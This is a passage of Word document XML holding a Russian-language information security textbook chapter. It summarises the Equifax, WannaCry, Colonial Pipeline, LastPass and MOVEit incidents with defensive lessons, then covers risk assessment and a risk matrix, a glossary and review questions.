        <w:t>147 миллионов американцев (почти половина населения США)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Штраф $700 миллионов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Акции упали на 35%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CEO Ричард Смит уволили (но с золотым парашютом $90 миллионов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обновляй софт!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если есть патч — ставь его немедленно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. WannaCry (2017) — Ransomware, 200,000 компьютеров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вирус-вымогатель (ransomware), шифрует файлы → требует $300 в биткоинах.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовал **EternalBlue** (эксплойт от АНБ, утёкший хакерам из группы Shadow Brokers).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Распространялся **без участия пользователя** (wormable).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Масштаб</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>200,000 компьютеров в **150 странах**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>NHS (британское здравоохранение): отменили операции, скорая помощь перенаправлялась в другие больницы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Испанская Telefonica, российские МВД/МЧС, Deutsche Bahn (железные дороги Германии).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Kill Switch</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исследователь **Marcus Hutchins** (@MalwareTechBlog) нашёл, что вирус проверяет существование домена `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если домен существует → вирус останавливается.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hutchins зарегистрировал домен за **$10.69** → остановил распространение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ирония</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Год спустя Hutchins был арестован в США за создание банковского трояна </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Kronos</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в 2014 году (до того, как остановил WannaCry). Получил условный срок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Обновляй Windows. Патч для EternalBlue вышел </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>за месяц до атаки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (MS17-010).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Colonial Pipeline (2021) — Ransomware, остановка нефтепровода</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры (группа **DarkSide**) зашифровали системы управления **Colonial Pipeline** (крупнейший нефтепровод США, 45% топлива для восточного побережья).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компания **остановила** трубопровод на **5 дней**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Паника, очереди на заправках, рост цен на бензин.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Colonial Pipeline заплатила выкуп **$4.4 миллиона** в биткоинах.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ФБР вернуло **$2.3 миллиона** (отследили кошелёк).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как зашли?</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украли **VPN-пароль** одного из сотрудников.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароль был **в утёкшей базе** (сотрудник использовал тот же пароль на другом сайте).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не используй одинаковые пароли на разных сайтах.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Включай 2FA для VPN.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. LastPass (2022) — Взлом менеджера паролей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры взломали **инженера LastPass** (через вредоносный софт на личном компьютере).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украли **резервные копии** зашифрованных хранилищ паролей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Данные **зашифрованы**, но если у пользователя **слабый мастер-пароль** → хакеры могут расшифровать (brute force).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что под угрозой</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все пароли пользователя.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если мастер-пароль `password123` → хакеры расшифруют за минуты.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если мастер-пароль `Tr0ub4dor&amp;3` → может потребоваться несколько лет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Паника среди пользователей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Массовая миграция на **1Password**, **Bitwarden**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LastPass рекомендовала сменить мастер-пароль и все пароли в хранилище.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Даже менеджеры паролей могут быть взломаны. Используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>длинный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> мастер-пароль (16+ символов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. MOVEit (2023) — Утечка данных тысяч компаний</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MOVEit Transfer** — ПО для безопасной передачи файлов (используют банки, госорганизации, корпорации).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Найдена уязвимость **SQL-инъекция** (CVE-2023-34362).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры (группа **Cl0p**) использовали уязвимость → украли данные **тысяч компаний**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жертвы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>British Airways, BBC, Shell, университеты, государственные органы США.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Более **60 миллионов** человек пострадали.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры требовали выкуп от каждой компании.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Некоторые заплатили, некоторые отказались.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок</w:t>
      </w:r>
      <w:r>
        <w:t>: Даже "безопасное" ПО может иметь уязвимости. Не доверяй слепо.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3.7. Оценка рисков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Угроз тысячи, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>невозможно защититься от всех</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Нужно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приоритизировать</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оценка рисков (Risk Assessment)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс определения, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какие угрозы наиболее опасны</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Формула риска</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Риск = Вероятность × Ущерб</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вероятность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — насколько вероятно, что угроза произойдёт (0% — 100%).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ущерб</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — какой урон нанесёт угроза (в деньгах, времени, репутации).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример расчёта рисков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сценарий</w:t>
      </w:r>
      <w:r>
        <w:t>: Интернет-магазин.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Угроза 1: SQL-инъекция на форме логина</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вероятность**: 80% (автоматические сканеры ищут уязвимости)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ущерб**: Высокий (хакеры могут украсть базу клиентов, изменить цены, удалить заказы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Риск**: 0.8 × 100 = **80 (критический)**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Угроза 2: Пожар в офисе (где стоит сервер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вероятность**: 1% (пожары редки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ущерб**: Высокий (серверы сгорят, данные потеряны)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Риск**: 0.01 × 100 = **1 (низкий)**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Угроза 3: DDoS-атака</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вероятность**: 20% (конкуренты могут заказать DDoS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ущерб**: Средний (сайт ляжет на несколько часов, потеря продаж)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Риск**: 0.2 × 50 = **10 (средний)**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Матрица рисков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">|              | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Низкий ущерб (1-30)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Средний ущерб (31-70)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Высокий ущерб (71-100)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------------|-------------------------|---------------------------|----------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Высокая вероятность (&gt; 50%)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Средний риск | Высокий риск | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Критический риск</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Средняя вероятность (20-50%)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Низкий риск | Средний риск | Высокий риск |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Низкая вероятность (&lt; 20%)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Низкий риск | Низкий риск | Средний риск |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Приоритизация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Критический риск (SQL-инъекция)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Действие**: Исправить **немедленно** (параметризованные запросы, WAF).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Средний риск (DDoS)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Действие**: Подключить Cloudflare (DDoS-защита).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Низкий риск (пожар)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Действие**: Резервное копирование в облако (AWS S3, offsite).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Информационная безопасность (ИБ)** — защита информации от несанкционированного доступа, изменения, уничтожения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CIA Triad** — Конфиденциальность (Confidentiality), Целостность (Integrity), Доступность (Availability)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Актив (Asset)** — всё, что имеет ценность и нуждается в защите</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уязвимость (Vulnerability)** — слабое место в системе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Угроза (Threat)** — потенциальная опасность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Риск (Risk)** — вероятность × ущерб</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Инсайдер (Insider)** — сотрудник или подрядчик с легитимным доступом</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Script Kiddie** — новичок-хакер, использующий готовые инструменты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хактивист (Hacktivist)** — хакер с политическими мотивами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**APT (Advanced Persistent Threat)** — продвинутая угроза (государственные акторы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ransomware** — вирус-вымогатель (шифрует данные за выкуп)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS (Distributed Denial of Service)** — распределённая атака отказа в обслуживании</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SQL-инъекция** — вставка вредоносного SQL-кода</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель угроз (Threat Model)** — формализованное описание угроз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**OWASP Top 10** — список 10 самых опасных уязвимостей веб-приложений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MITM (Man-in-the-Middle)** — атака посредника (перехват и изменение данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Zero-day (0-day)** — уязвимость, неизвестная разработчикам (нет патча)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kill Switch** — механизм аварийной остановки (как в WannaCry)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теоретические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое информационная безопасность?** Объясни связь с CIA Triad.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём разница между уязвимостью, угрозой и риском?** Приведи примеры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Классифицируй угрозы по источнику.** Кто опаснее: инсайдер или внешний хакер? Почему?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясни три типа воздействия на CIA Triad.** Приведи по одному реальному примеру нарушения конфиденциальности, целостности и доступности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое модель угроз (Threat Model)?** Зачем она нужна?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое OWASP Top 10?** Назови 5 уязвимостей из списка.</w:t>
      </w:r>
